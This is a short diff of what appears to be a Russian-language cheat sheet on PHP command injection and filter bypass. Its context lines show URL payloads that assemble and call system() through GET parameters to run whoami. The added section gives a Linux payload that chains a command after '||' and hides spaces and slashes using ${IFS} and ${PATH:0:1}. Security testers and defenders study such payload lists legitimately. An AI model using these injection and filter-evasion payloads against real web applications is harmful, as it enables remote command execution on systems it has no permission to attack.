@@ -158,3 +158,7 @@ vuln.php?param=$a=['s','y','s','t','e','m'];$a=''.$a[0].$a[1].$a[2].$a[3].$a[4].
 ```php
 vuln.php?param=$_GET[a]($_GET[b]);&a=system&b=whoami
 ```
+- Обход фильтрации пробела, символа `/` команд Linux
+```bash
+||l$@s${IFS}${PATH:0:1}home
+```
